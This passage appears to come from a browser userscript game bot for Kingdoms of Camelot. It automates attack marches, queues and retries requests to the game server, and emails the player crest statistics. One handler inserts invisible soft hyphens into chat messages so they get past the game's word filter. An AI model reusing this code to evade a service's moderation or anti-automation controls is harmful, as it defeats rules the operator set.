        message += '%0A Crests Gained (for '+ Options.CrestMsgInterval +' hour of cresting) on a Level: '+Options.CrestLevel+' '+wildtype+'%0A';

        for (crest in Options.Creststatus) {
            owned = Seed.items['i'+crest];
            if (owned == undefined)
                owned =    0;
            if ((owned - Options.Creststatus[crest]) > 0)
                message    +=     '<DIV><B>' + unsafeWindow.itemlist['i'+crest]['name'] +': '+ (owned - Options.Creststatus[crest]) +'%0A </b></div>';
            else
                message    +=     unsafeWindow.itemlist['i'+crest]['name'] +': '+ (owned - Options.Creststatus[crest]) +'%0A';
                
            total += (owned - Options.Creststatus[crest]);
            Options.Creststatus[crest] = owned;
        }
        
        message += '%0A Total Crests gained: '+ total +'%0A';
        message += '%0A Numbers of 1st Wave send: '+ Options.Crest1Count +'%0A';
        message += 'Numbers of 2nd Wave send: '+ Options.Crest2Count +'%0A';

        Options.Crest1Count = 0;
        Options.Crest2Count = 0;

        var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
        params.emailTo = Seed.player['name'];
        params.subject = "Crest Overview";
        params.message = message;
        params.requestType = "COMPOSED_MAIL";
        
        new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getEmail.php" + unsafeWindow.g_ajaxsuffix, {
            method: "post",
            parameters: params,
            onSuccess: function (message) {
                var rslt = eval("(" + message.responseText + ")");
                if (rslt.ok) {
                    Options.LastCrestReport = now;
                }
            },
            onFailure: function () {
            },
        });

        saveOptions();
    },  


    hide : function (){
        var t = Tabs.Crest;
    },

    show : function (){
    },
 };
/** End Cresting tab **/

/****** Global march function ****/

var March = {
    tt : null,
    profiler : null,
    currentrequests : 0,
    queue : [],
    lastattack : null,
    timer : null,
  
    //March queue system
    addMarch : function (params, callback){
        var t = this;
        var opts = {params:params, callback:callback};
        if(t.currentrequests < 5){
            t.sendMarch(opts.params, opts.callback);
        } else {
            t.queue.push(opts);
            //setTimeout(t.loop, 2000);
        }
    },
    loop : function (){
        var t = this;
        if(t.currentrequests < 5){
            var opts = t.queue.shift();
			if(opts)
				t.sendMarch(opts.params, opts.callback);
        }
    },
    getQueueLength : function (){
        var t = this;
        return t.queue.length;
    },
    //End march queue
	
	//Call March.RallyPoint(cityId) to get all values
	RallyPoint : function (cityId){
		var t = this;
		var ret = {};
		ret.level = t.getRallyPointLevel(cityId);
		ret.maxSlots = t.getTotalSlots(cityId);
		ret.marching = t.getMarchSlots(cityId);
		ret.emptySlots = t.getEmptySlots(cityId);
		ret.maxSize = t.getMaxSize(cityId);
		return ret;
	},
	
	//Rallypoint
	getRallypointLevel : function (cityId){
        var t = this;
		cityId = "city"+cityId;
		rallypointlevel = 0;
		for (var o in Seed.buildings[cityId]){
			var buildingType = parseInt(Seed.buildings[cityId][o][0]);
			var buildingLevel = parseInt(Seed.buildings[cityId][o][1]);
			if (buildingType == 12) rallypointlevel=parseInt(buildingLevel);
		}
		return rallypointlevel;
	},
	getTotalSlots : function (cityId){
        var t = this;
		var ascended = t.getAscendedStats(cityId);
		var rallypointlevel = t.getRallypointLevel(cityId);
		var slots = rallypointlevel; //Set default number of slots to rallypointlevel
		if(ascended.isPrestigeCity){
			switch(ascended.prestigeLevel){
				case 1:
					slots += 1;
					break;
				case 2:
					slots += 2;
					break;
				case 3:
					slots += 3;
					break;
				default:
					//Do nothing
					break;
			}
		}
		return slots;
	},
	getMarchSlots : function (cityId){
        var t = this;
		cityId = "city"+cityId;
		var slots=0;
		if (Seed.queue_atkp[cityId] != undefined){
			for(var k in Seed.queue_atkp[cityId]){
				var m = Seed.queue_atkp[cityId][k];
				if(m.marchType == 9){
					if(m.botMarchStatus != 3 || m.botState != 3){ //If raid is stopped take it as empty slot
						slots++;
					}
				} else {
					slots++;				
				}
			}
			if(Seed.queue_atkp[cityId].toSource() == "[]")
				slots = 0;
		} else {
            slots=0;
		}
		return slots;
	},
	getEmptySlots : function (cityId){
        var t = this;
		var slots = t.getTotalSlots(cityId);
		slots -= t.getMarchSlots(cityId);
		if(slots < 0) //For the odd chance more waves get sent out than allowed
			slots = 0;
		return slots;
	},
	getMaxSize : function (cityId){
		var t = this;
		var rallypointlevel = getCityBuilding(cityId, 12).maxLevel;
		var ascended = t.getAscendedStats(cityId);
		var buff = 1;
		var max = 0;
		var now = unixTime();
		if (Seed.playerEffects.aurasExpire) {
			if (Seed.playerEffects.aurasExpire > now) {
				buff += 1.15
			}
		}
		if (Seed.playerEffects.auras2Expire) {
			if (Seed.playerEffects.auras2Expire > now) {
				buff += 1.3
			}
		}
		var tr = Math.floor(equippedthronestats(66));
		if (tr>unsafeWindow.cm.thronestats.boosts.MarchSize.Max)tr=unsafeWindow.cm.thronestats.boosts.MarchSize.Max;
		if(tr > 0)buff+=(tr/100);
		
		if(ascended.isPrestigeCity){
			var b = ascended.prestigeLevel;
			var r = unsafeWindow.cm.WorldSettings.getSetting("ASCENSION_RALLYPOINT_BOOST"),
                m = JSON.parse(r),
                u = m.values[b - 1][1],
                k = parseFloat(u);
            buff *= k
            if(unsafeWindow.seed.cityData.city[cityId].prestigeInfo.blessings.indexOf(207) != -1)buff *= 1.1;
		}
		switch(rallypointlevel){
			case 11:
				max = 150000 * buff;
				break;
			case 12:
				max = 200000 * buff;
				break;
			default:
				max = (rallypointlevel * 10000) * buff;
				break;
		}
		logit('max is '+max);
		return max;
	},
	getAscendedStats : function (cityId){
		var t = this;
		var ret = {};
		if(Seed.cityData.city[cityId].isPrestigeCity){
			ret.isPrestigeCity = true;
			ret.prestigeLevel = parseInt(Seed.cityData.city[cityId].prestigeInfo.prestigeLevel);
			ret.prestigeType = parseInt(Seed.cityData.city[cityId].prestigeInfo.prestigeType);
			ret.blessings = parseInt(Seed.cityData.city[cityId].prestigeInfo.blessings);
		} else {
			ret.isPrestigeCity = false;
		}
		return ret;
	},
	//End Rallypoint
  
    sendMarch : function (params, callback){
        var t = this;
        t.profiler = new unsafeWindow.cm.Profiler("ResponseTime", "march.php");
        t.currentrequests++;
        //alert(inspect(params));
        new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {   
            method: "post",
            parameters: params,
            loading: true,
            onSuccess: function (transport) {
                t.profiler.stop();
                --t.currentrequests;
                var rslt = eval("(" + transport.responseText + ")");
                 if (rslt.updateSeed) {
                        unsafeWindow.update_seed(rslt.updateSeed)
                    }
                if (rslt.ok) {
                    var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
                    var ut = unsafeWindow.unixtime();
				var unitsarr = [];
				for (j in unsafeWindow.unitcost)
					unitsarr.push(0);
				for(i = 0; i <= unitsarr.length; i++)
					if(params["u"+i])
						unitsarr[i] = params["u"+i];
                    var resources=[0,0,0,0,0,0,0,0,0,0,0,0,0];


                    var currentcityid = params.cid;
                    unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
                  
                    unsafeWindow.update_seed(rslt.updateSeed);
                    if (rslt.updateSeed) {
                        unsafeWindow.update_seed(rslt.updateSeed);
                    }
                    if(callback)
                        callback(rslt);
                } else {
                    if (rslt.user_action == "backOffWaitTime") {
                        logit('backoffwaittime '+rslt.wait_time);
                        if(rslt.tt)
                            params.tt = rslt.tt;
                        var wait = 1;
                        if(rslt.wait_time)
                            wait = rslt.wait_time;
                        setTimeout (function(){t.sendMarch(params,callback);}, wait*1000);
                        return;
                    }
                    if (rslt.user_action == "marchWarning") {
                        logit('marchWarning');
                        params.marchWarning = 1;
                        setTimeout (function(){t.sendMarch(params,callback);}, 5*1000);
                        return;
                    }
                    if (rslt.user_action == "marchCaptcha") {
                        logit('captcha');
                        if(!unsafeWindow.Recaptcha){
                            setTimeout (function(){t.sendMarch(params,callback);}, 5*1000);
                            return;
                        }
                        t.captchawin = new pbPopup ('pbmarch_captcha', 0, 0, 300, 200, true);
                        t.captchawin.centerMe (mainPop.getMainDiv);
                        var m = "<CENTER><SPAN class=boldRed>CAPTCHA ALERT! You have been sending too many attacks!</span></center><br \>";
                        m += "<CENTER><div class=\"captcha_container\"><form id=pbmarch_captchaform ></form></div></center>";
                        t.captchawin.getMainDiv().innerHTML = m;
                        t.captchawin.getTopDiv().innerHTML = "<CENTER><b>KOC Power Bot - March Captcha</b></center>";
                        t.captchawin.show(true);
                      
                        unsafeWindow.Recaptcha.create("6LcT7cQSAAAAAG4whvbBz60hGjJg0ON1wRIRv_iD", "pbmarch_captchaform", {
                            callback: function(){
                                unsafeWindow.Recaptcha.focus_response_field();
                                $("pbmarch_captchaform").addEventListener("submit", function(e){
                                    e.preventDefault();
                                    e.stopPropagation();
                                    params.marchWarning = 1;
                                    params.marchCaptcha_challenge = unsafeWindow.Recaptcha.get_challenge();
                                    params.marchCaptcha_response = unsafeWindow.Recaptcha.get_response();
                                    setTimeout (function(){t.sendMarch(params,callback);}, 5*1000);
                                    t.captchawin.destroy();
                                }, false);
                            },
                            theme: "white"
                        });
                        return;
                    }
                    setTimeout (function(){callback(rslt)}, 5*1000); //return all sever excess traffic error to original function to handle
                    return;
                }
                t.loop();
            },
            onFailure: function (transport) {
                t.profiler.stop();
                --t.currentrequests;
                if(callback)
                    callback({ok:false}); //return all onFailure as {ok:false} so as to trigger remarch
                t.loop(); //Always check for the next queued march after a request
            }
          });
    }
};



//override for kabams SUPER ANNOYING word filter...   deSCRIPTion
//The point is to not enable rude/bad words but simply curb some of the excessive filtering
if(Options.filter)
document.getElementById('mod_comm_input').addEventListener ('keypress', function(e) {
	if(e.which != 13)
	return;
	var whisper = "";
	var firstindex = 0;
	if(this.value.charAt(0) == "/" || this.value.charAt(0) == "@") {
	firstindex = this.value.indexOf(" ");
	whisper = this.value.slice(0,firstindex);
	};
	var m = this.value.substr(firstindex,this.value.length);
	var x = '­';
	m = m.replace(/Fa/g,'F'+x+'a').replace(/fA/g,'f'+x+'A').replace(/FA/g,'F'+x+'A').replace(/fa/g,'f'+x+'a');
	
	m = m.replace(/Gr/g,'G'+x+'r').replace(/gR/g,'g'+x+'R').replace(/GR/g,'G'+x+'R').replace(/gr/g,'g'+x+'r');
	
	m = m.replace(/Ri/g,'R'+x+'i').replace(/rI/g,'r'+x+'I').replace(/RI/g,'R­'+x+'I').replace(/ri/g,'r'+x+'i');
	
	m = m.replace(/Na/g,'N'+x+'a').replace(/nA/g,'n'+x+'A').replace(/NA/g,'N'+x+'A').replace(/na/g,'n'+x+'a');
	
	this.value = whisper+m;
}, false);
var kboxtime = 1;
function killbox () {
	kboxtime += 1;
	if(!Options.KMagicBox)
		return;
	if (kboxtime > 50)
		return;
	if (Number(unsafeWindow.seed.items.i599) == 0)
		return;
	if(!document.getElementById('modal_mmb'))
		setTimeout(killbox,100);
	else {
		unsafeWindow.Modal.hideModal();
		//document.getElementById('modalBox1').hidden = true;
		//document.getElementById('modalCurtain1').outerHTML= 'Modal.hideModal();';
	};
};

function equippedthronestats (stat_id){
	var current_slot = Seed.throne.activeSlot;
	var equip_items = Seed.throne.slotEquip[current_slot];
	var total = 0;
	for(var k = 0; k<equip_items.length; k++){
		var item_id = equip_items[k];
		var item = unsafeWindow.kocThroneItems[item_id];
		for(var i = 1; i<=item.quality; i++){
			if(item["effects"]["slot"+i]){
				var id = item["effects"]["slot"+i]["id"];
				if(id == stat_id){
					var tier = parseInt(item["effects"]["slot"+i]["tier"]);
					var level = item["level"];
					var p = unsafeWindow.cm.thronestats.tiers[id][tier];
					var Percent = p.base + ((level * level + level) * p.growth * 0.5);
					total += Percent;
				}
			}
		}
	}
	return total;
}

function fixkabamlag () {
	var kfutime = Number(unsafeWindow.unixtime()+30);
	for (city in Seed.queue_atkp) {
		var kabamhashX = [];
		if(Seed.queue_atkp[city] != "")
		for (march in Seed.queue_atkp[city]) {
			if(Seed.queue_atkp[city][march].marchType)
				if(Seed.queue_atkp[city][march].botMarchStatus == undefined && Seed.queue_atkp[city][march].marchStatus == 5) {
					if (Seed.queue_atkp[city][march].returnUnixTime < kfutime) {
						logit('fixing march from '+city+' with id '+march);
						
						//the following code will be a future option?  to return all troops or forget them until updateseed? or refresh
						for (var i=0;i<17;i++) {
							if (Seed.queue_atkp[city][march]['unit'+i+'Count'] > 0)
							if(Seed.queue_atkp[city][march]['unit'+i+'Return'] == 0 || Seed.queue_atkp[city][march]['unit'+i+'Return'] == undefined)
							Seed.queue_atkp[city][march]['unit'+i+'Return'] = Seed.queue_atkp[city][march]['unit'+i+'Count'];
						};
						
						Seed.queue_atkp[city][march].hasUpdated = true;
						Seed.queue_atkp[city][march].marchStatus = 8;
					} else kabamhashX.push(Seed.queue_atkp[city][march].knightId);
				} else kabamhashX.push(Seed.queue_atkp[city][march].knightId);
		}
		for (knight in Seed.knights[city]) {
			if(Seed.knights[city][knight].knightStatus != 1)
				if(kabamhashX.indexOf(Seed.knights[city][knight].knightId) == -1) {
					Seed.knights[city][knight].knightStatus = 1;
					logit('march '+city+' fixing knight '+knight);
				}
		}
	}
}
 
pbStartup ();
